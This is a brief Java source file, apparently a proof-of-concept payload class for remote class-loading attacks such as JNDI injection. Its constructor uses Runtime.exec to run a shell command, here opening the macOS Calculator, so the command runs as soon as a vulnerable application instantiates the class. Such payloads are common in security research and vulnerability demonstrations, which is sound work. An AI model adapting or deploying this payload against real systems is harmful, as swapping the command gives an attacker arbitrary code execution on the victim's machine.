public class RemoteEvilObject {
    public RemoteEvilObject() {
        try {
            Runtime.getRuntime().exec("open /System/Applications/Calculator.app");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
